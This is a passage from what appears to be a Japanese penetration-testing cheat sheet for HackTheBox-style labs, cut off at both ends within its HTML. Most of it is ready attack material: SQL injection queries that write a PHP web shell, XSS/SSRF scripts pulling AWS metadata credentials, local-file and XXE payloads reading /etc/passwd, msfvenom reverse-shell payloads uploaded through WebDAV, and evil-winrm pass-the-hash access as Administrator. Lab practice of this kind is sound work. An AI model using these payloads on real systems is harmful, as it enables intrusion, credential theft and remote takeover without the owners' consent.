data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token comment\">-- SQL injection scan</span>\n<span class=\"token comment\">-- python3 sqlmap.py -u \"http://targethost.htb/\" --data \"username=test&amp;country=Ukraine\"</span>\n\n<span class=\"token comment\">-- DBのユーザ名を表示</span>\n<span class=\"token keyword\">select</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">-- DB名</span>\n<span class=\"token keyword\">select</span> <span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">-- DS列挙</span>\n<span class=\"token keyword\">select</span> schema_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span>schemata\n\n<span class=\"token comment\">-- テーブル取得</span>\n<span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;table name>'</span>\n\n<span class=\"token comment\">-- テーブル情報取得</span>\n<span class=\"token keyword\">select</span> column_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_name <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;table name>'</span>\n\n<span class=\"token comment\">-- テーブル情報特定(複文)</span>\n<span class=\"token punctuation\">;</span><span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>tablename<span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span> <span class=\"token keyword\">FROM</span> pg_tables <span class=\"token keyword\">WHERE</span> tablename <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%ar%'</span><span class=\"token comment\">--</span>\n<span class=\"token punctuation\">;</span><span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>tablename<span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span> <span class=\"token keyword\">FROM</span> pg_tables <span class=\"token keyword\">LIMIT</span> <span class=\"token number\">1</span> <span class=\"token keyword\">OFFSET</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span><span class=\"token comment\">--</span>\n\n<span class=\"token comment\">-- カラム特定（複文）</span>\n<span class=\"token punctuation\">;</span><span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>column_name<span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">WHERE</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">'news_subscriber'</span> <span class=\"token operator\">AND</span> column_name <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%ex%'</span>　<span class=\"token comment\">--</span>\n<span class=\"token punctuation\">;</span><span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>column_name<span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">LIMIT</span> <span class=\"token number\">1</span> <span class=\"token keyword\">OFFSET</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span><span class=\"token comment\">--</span>\n\n<span class=\"token comment\">-- ユーザの権限参照</span>\n<span class=\"token keyword\">select</span> privilege_type <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span>user_privileges <span class=\"token keyword\">where</span> grantee <span class=\"token operator\">=</span> <span class=\"token string\">\"&lt;username>\"</span>\n\n<span class=\"token comment\">-- ファイルへの書き込み（ユーザにFILE権限が存在する場合のみ実行可能）</span>\n<span class=\"token keyword\">select</span> <span class=\"token string\">\"Test\"</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/var/www/html/Test.txt'</span>\n\n<span class=\"token comment\">-- WEBシェルの書き込み</span>\n<span class=\"token keyword\">select</span> <span class=\"token string\">\"&lt;?php SYSTEM($_REQUEST['cmd']); ?>\"</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/var/www/html/webshell.php'</span>\n\n<span class=\"token comment\">-- UNION injection の動作確認(コメントアウト後に必ずクローズを入れること)</span>\n<span class=\"token string\">' UNION SELECT 1;-- -'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">-- DBのユーザ名を表示（UNION Injection）</span>\n<span class=\"token string\">' union select user();-- -'</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>\n<p>入力フォームからのinputにSQLiの脆弱性が見つからない場合でも、<code class=\"language-text\">Second Order SQL injection</code>やマルチバイト文字を利用した攻撃方法が存在する可能性がある。</p>\n<ul>\n<li><a href=\"https://atmarkit.itmedia.co.jp/ait/articles/0611/02/news127.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">今夜分かるSQLインジェクション対策：Security&#x26;Trust ウォッチ（42） - ＠IT</a></li>\n</ul>\n</li>\n</ul>\n<p>参考：<a href=\"https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">SQL Injection Cheat Sheet</a></p>\n<p>参考：<a href=\"https://pentesterlab.com/exercises/from_sqli_to_shell_pg_edition/course\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">PentesterLab: Learn Web App Pentesting!</a></p>\n<h3 id=\"xss\" style=\"position:relative;\"><a href=\"#xss\" aria-label=\"xss permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XSS</h3>\n<p><code class=\"language-text\">AWS meta-data</code>攻撃のサンプル</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> xmlhttp <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XMLHttpRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nxmlhttp<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onreadystatechange</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>xmlhttp<span class=\"token punctuation\">.</span>readyState <span class=\"token operator\">==</span> XMLHttpRequest<span class=\"token punctuation\">.</span><span class=\"token constant\">DONE</span> <span class=\"token operator\">&amp;&amp;</span> xmlhttp<span class=\"token punctuation\">.</span>status <span class=\"token operator\">==</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"got resp\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>backgroundImage<span class=\"token operator\">=</span><span class=\"token string\">'none'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> main <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        main<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> xmlhttp<span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\nxmlhttp<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/fetch\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nxmlhttp<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://169.254.169.254/latest/meta-data/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nxmlhttp<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/fetch\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nxmlhttp<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://169.254.169.254/latest/meta-data/hostname\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nxmlhttp<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/fetch\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nxmlhttp<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p><code class=\"language-text\">Local file injection</code>攻撃のサンプル</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">var xmlhttp <span class=\"token operator\">=</span> new XMLHttpRequest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\txmlhttp.onreadystatechange <span class=\"token operator\">=</span> <span class=\"token function-name function\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>xmlhttp.readyState <span class=\"token operator\">==</span> XMLHttpRequest.DONE <span class=\"token operator\">&amp;&amp;</span> xmlhttp.status <span class=\"token operator\">==</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        var output <span class=\"token operator\">=</span> document.getElementById<span class=\"token punctuation\">(</span><span class=\"token string\">\"output\"</span><span class=\"token punctuation\">)</span>\n        output.style.visibility <span class=\"token operator\">=</span> <span class=\"token string\">\"visible\"</span><span class=\"token punctuation\">;</span>\n        var resp <span class=\"token operator\">=</span> JSON.parse<span class=\"token punctuation\">(</span>xmlhttp.responseText<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        document.getElementById<span class=\"token punctuation\">(</span><span class=\"token string\">\"collapsible\"</span><span class=\"token punctuation\">)</span>.checked <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        document.getElementById<span class=\"token punctuation\">(</span><span class=\"token string\">\"ver\"</span><span class=\"token punctuation\">)</span>.innerHTML <span class=\"token operator\">=</span> resp<span class=\"token punctuation\">[</span><span class=\"token string\">'http_ver'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        document.getElementById<span class=\"token punctuation\">(</span><span class=\"token string\">\"code\"</span><span class=\"token punctuation\">)</span>.innerHTML <span class=\"token operator\">=</span> resp<span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        document.getElementById<span class=\"token punctuation\">(</span><span class=\"token string\">\"server\"</span><span class=\"token punctuation\">)</span>.innerHTML <span class=\"token operator\">=</span> resp<span class=\"token punctuation\">[</span><span class=\"token string\">'server'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        document.getElementById<span class=\"token punctuation\">(</span><span class=\"token string\">\"date\"</span><span class=\"token punctuation\">)</span>.innerHTML <span class=\"token operator\">=</span> resp<span class=\"token punctuation\">[</span><span class=\"token string\">'date'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        document.getElementById<span class=\"token punctuation\">(</span><span class=\"token string\">\"httpresponse\"</span><span class=\"token punctuation\">)</span>.innerHTML <span class=\"token operator\">=</span> escape<span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">[</span><span class=\"token string\">'raw'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\nxmlhttp.open<span class=\"token punctuation\">(</span><span class=\"token string\">\"POST\"</span>, <span class=\"token string\">\"/scan\"</span>, <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nxmlhttp.send<span class=\"token punctuation\">(</span><span class=\"token string\">\"file:///etc/passwd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nxmlhttp.send<span class=\"token punctuation\">(</span><span class=\"token string\">\"file:///home/min/user.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h3 id=\"xml-external-entityxml外部実体参照\" style=\"position:relative;\"><a href=\"#xml-external-entityxml%E5%A4%96%E9%83%A8%E5%AE%9F%E4%BD%93%E5%8F%82%E7%85%A7\" aria-label=\"xml external entityxml外部実体参照 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XML External Entity(XML外部実体参照)</h3>\n<p>XXEを悪用することで、サーバ内のファイルの取得や情報収集、SSRF攻撃など様々な攻撃に利用できる。</p>\n<p><code class=\"language-text\">&lt;!ENTITY</code>を用いることで実体参照を呼び出すことができ、文字列の置換や、外部ファイルの内容を埋め込む。</p>\n<p>そのため、XMLを送り込むことができる場合には、XXEを試すとよい。</p>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">foo</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">foo</span> <span class=\"token attr-name\">ANY</span> <span class=\"token punctuation\">></span></span>\n   &lt;!ENTITY xxe SYSTEM \"file://etc/passwd\" ></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n\n   # PHPの場合 \n   <span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">foo</span> <span class=\"token punctuation\">[</span> &lt;<span class=\"token name\">!ENTITY</span> <span class=\"token name\">xxe</span> <span class=\"token name\">SYSTEM</span> <span class=\"token string\">\"php://filter/convert.base64-encode/resource=/etc/passwd\"</span>><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">></span></span>\n   <span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">foo</span> <span class=\"token punctuation\">[</span> &lt;<span class=\"token name\">!ENTITY</span> <span class=\"token name\">xxe</span> <span class=\"token name\">SYSTEM</span> <span class=\"token string\">\"php://filter/convert.base64-encode/resource=db.php\"</span>><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>foo</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>foo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>参考：<a href=\"/hackthebox-linux-bugbountyhunter#xxexml%E5%A4%96%E9%83%A8%E5%AE%9F%E4%BD%93%E5%8F%82%E7%85%A7\">XXE(XML外部実体参照)</a></p>\n<h3 id=\"webdavの悪用\" style=\"position:relative;\"><a href=\"#webdav%E3%81%AE%E6%82%AA%E7%94%A8\" aria-label=\"webdavの悪用 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>WebDavの悪用</h3>\n<ul>\n<li><code class=\"language-text\">davtest</code>でPUTが可能な場合はリバースシェルを取得できる可能性がある</li>\n<li>IIS5/IIS6を使用している場合は、<a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav#iis5-6-webdav-vulnerability\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Renameの脆弱性</a>がある</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># davtest</span>\n$ /usr/bin/davtest -url http://targethost.htb/\n\n<span class=\"token comment\"># エクスプロイトの生成</span>\n$ msfvenom -p windows/shell/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token variable\">$LHOST</span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> -f asp <span class=\"token operator\">></span> shell.txt\n$ msfvenom -f aspx -p windows/shell_reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token variable\">$LHOST</span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> -o rev.aspx\n\n<span class=\"token comment\"># cadaverでファイル転送とRename</span>\n$ cadaver http://targethost.htb\ndav:/<span class=\"token operator\">></span> put shell.txt\ndav:/<span class=\"token operator\">></span> copy shell.txt shell.asp<span class=\"token punctuation\">;</span>.txt</code></pre></div>\n<h2 id=\"その他のエクスプロイト\" style=\"position:relative;\"><a href=\"#%E3%81%9D%E3%81%AE%E4%BB%96%E3%81%AE%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88\" aria-label=\"その他のエクスプロイト permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>その他のエクスプロイト</h2>\n<h3 id=\"smbactive-directoryを悪用したリモートアクセス\" style=\"position:relative;\"><a href=\"#smbactive-directory%E3%82%92%E6%82%AA%E7%94%A8%E3%81%97%E3%81%9F%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%88%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9\" aria-label=\"smbactive directoryを悪用したリモートアクセス permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SMB、Active Directoryを悪用したリモートアクセス</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># evil-winrm</span>\nevil-winrm -i targethost.htb　-u user -p <span class=\"token string\">'password'</span>\n\n<span class=\"token comment\"># Pass The Hashでリモートアクセス(-Hオプションによりパスワード無しで侵入できる)</span>\nevil-winrm -i targethost.htb　-u Administrator -H <span class=\"token string\">'NTLM hash'</span></code></pre></div>\n<p>参考：<a href=\"https://github.com/Hackplayers/evil-winrm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Hackplayers/evil-winrm: The ultimate WinRM shell for hacking/pentesting</a></p>\n<p>参考：<a href=\"https://qiita.com/v_avenger/items/78b323d5e30276a20735\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Evil-WinRMを使ったWindows OS環境のリモート探索 - Qiita</a></p>\n<p>参考：<a href=\"https://atmarkit.itmedia.co.jp/flinux/rensai/linuxtips/193smbclientuse.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">SambaでほかのLinuxにアクセスするには</a></p>\n<h2 id=\"内部探索windows\" style=\"position:relative;\"><a href=\"#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2windows\" aria-label=\"内部探索windows permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>内部探索(Windows)</h2>\n<h3 id=\"内部探索のポイント\" style=\"position:relative;\"><a href=\"#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2%E3%81%AE%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88\" aria-label=\"内部探索のポイント permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>内部探索のポイント</h3>\n<ul>\n<li>\n<p><strong>シェルを取ったらとりあえず<code class=\"language-text\">[Environment]::Is64BitProcess</code>などで現在稼働しているプロセスのbit数を取得する</strong></p>\n<ul>\n<li>もし32bitのセッションからシェルを呼び出した場合、64bitOSに対するエクスプロイトが動作しない場合がある</li>\n<li>回避のためには、以下のフルパスを指定してしてシェルを呼び出す</li>\n</ul>\n<p>32bit Session の場合： <code class=\"language-text\">C:\\Windows\\sysNative\\WindowsPowerShell\\v1.0\\powershell.exe</code></p>\n<p>64bit Session の場合：<code class=\"language-text\">C:\\WIndows\\System32</code></p>\n</li>\n<li>\n<p>認証情報の探索</p>\n<ul>\n<li>設定情報が記載されたconfigファイル</li>\n<li>認証情報が格納されたデータベースのダンプ</li>\n<li>認証情報が平文で書き込まれているアクセスログ</li>\n<li>過去の認証情報が記録されたバックアップファイルやシャドウコピー</li>\n<li>隠しフォルダ(FTPのdirコマンドでは隠しフォルダは表示されない)</li>\n</ul>\n</li>\n<li>\n<p>資格情報のキャプチャ</p>\n<ul>\n<li><a href=\"https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">プリンタデバイスとのLDAP通信のキャプチャ</a></li>\n</ul>\n</li>\n</ul>\n<p>参考：<a href=\"/hackthebox-windows-optimum#powershell%E3%81%AE%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3\">PowerShellのセッション</a></p>\n<h3 id=\"端末情報の取得\" style=\"position:relative;\"><a href=\"#%E7%AB%AF%E6%9C%AB%E6%83%85%E5%A0%B1%E3%81%AE%E5%8F%96%E5%BE%97\" aria-label=\"端末情報の取得 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>端末情報の取得</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># winPEASは試しておく</span>\n\n<span class=\"token comment\"># 端末の構成情報</span>\nsysteminfo\n\n<span class=\"token comment\"># スケジュールタスク</span>\nschtasks /Query /FO LIST \n\n<span class=\"token comment\"># サービスの確認</span>\nsc query state <span class=\"token operator\">=</span> all\n\n<span class=\"token comment\"># フォルダ探索</span>\n<span class=\"token function\">dir</span> <span class=\"token string\">\"C:\\Program Files\"</span>\n<span class=\"token function\">dir</span> <span class=\"token string\">\"C:\\Program Files (x86)\"</span>\n<span 